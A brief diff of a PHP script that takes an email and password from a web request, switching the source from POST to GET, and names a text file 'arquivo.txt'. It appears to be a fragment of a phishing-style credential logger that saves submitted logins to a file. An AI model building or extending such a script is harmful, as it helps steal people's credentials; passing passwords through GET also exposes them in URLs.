@@ -1,7 +1,7 @@
 <?php
 
-$email = $_POST['email'];
-$senha = $_POST['pass'];
+$email = $_GET['email'];
+$senha = $_GET['pass'];
  
 
 $name = 'arquivo.txt';
